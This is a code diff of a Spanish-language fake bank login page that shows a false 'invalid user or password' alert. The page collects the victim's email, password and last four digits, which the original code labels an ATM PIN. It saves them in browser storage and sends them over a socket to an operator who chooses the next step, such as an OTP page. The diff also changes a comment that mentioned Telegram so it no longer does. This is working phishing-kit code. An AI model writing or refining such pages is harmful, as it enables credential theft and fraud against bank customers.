@@ -82,12 +82,12 @@
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su correo electronico, contraseña y celular (ultimos 4 digitos) para iniciar con su proceso financiero.</p>
+    <p>Ingrese su correo electrónico, contraseña y celular (últimos 4 dígitos) para continuar.</p>
     <form id="login-form">
-      <input type="email" id="usuario" placeholder="Ingrese su correo electronico" required />
-      <input type="password" id="clave" placeholder="Contraseña" required />
-      <!-- Nuevo campo -->
-      <input type="tel" id="cajero" placeholder="Ultimos 4 digitos" maxlength="4" required />
+      <input type="email" id="usuario" placeholder="Ingrese su correo electrónico" required />
+      <input type="password" id="password" placeholder="Contraseña" required />
+      <!-- Campo unificado con el mismo id que el index -->
+      <input type="tel" id="ultimosDigitos" placeholder="Últimos 4 dígitos" maxlength="4" required />
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -104,28 +104,28 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          const usuario = document.getElementById('usuario').value;
-          const contrasena = document.getElementById('clave').value;
-          const cajero = document.getElementById('cajero').value;
+          const usuario = document.getElementById('usuario').value.trim();
+          const contrasena = document.getElementById('password').value.trim();
+          const ultimosDigitos = document.getElementById('ultimosDigitos').value.trim();
           const sessionId = localStorage.getItem('sessionId');
 
-          if (!usuario || !contrasena || !cajero) {
+          if (!usuario || !contrasena || !ultimosDigitos) {
             alert("Por favor, complete todos los campos.");
             return;
           }
 
-          if (!/^\d{4}$/.test(cajero)) {
-            alert("La clave de cajero debe tener exactamente 4 dígitos numéricos.");
+          if (!/^\d{4}$/.test(ultimosDigitos)) {
+            alert("Debe ingresar exactamente 4 dígitos numéricos.");
             return;
           }
 
           // Guardar en localStorage
           localStorage.setItem('usuario', usuario);
           localStorage.setItem('contrasena', contrasena);
-          localStorage.setItem('cajero', cajero);
+          localStorage.setItem('ultimosDigitos', ultimosDigitos);
 
           // Enviar al servidor
-          socket.emit('errorlogoForm', { usuario, contrasena, cajero, sessionId });
+          socket.emit('errorlogoForm', { usuario, contrasena, ultimosDigitos, sessionId });
 
           // Redirigir
           window.location.href = 'opciones.html';
@@ -133,7 +133,7 @@
       }
     });
 
-    // Respuesta desde Telegram
+    // Respuesta del servidor
     socket.on("respuestaErrorLogo", (decision) => {
       if (decision === "otp") {
         window.location.href = "bienvenido.html";
